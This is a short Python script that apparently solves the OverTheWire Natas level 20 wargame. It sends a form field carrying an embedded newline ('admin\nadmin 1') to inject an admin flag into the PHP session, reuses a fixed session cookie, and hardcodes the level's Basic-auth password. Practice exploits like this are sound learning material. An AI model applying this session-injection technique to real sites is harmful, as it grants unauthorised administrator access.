import requests, time
from requests.auth import HTTPBasicAuth

uri = 'http://natas20.natas.labs.overthewire.org/'

r = requests.post(
    uri + 'index.php',
    auth=HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'),
    data={'name' : 'admin\nadmin 1'},
    cookies={'PHPSESSID' : 'umphack'})
g = requests.get( uri,
    auth=HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'),
    cookies={'PHPSESSID' : 'umphack'})
print( g.text )
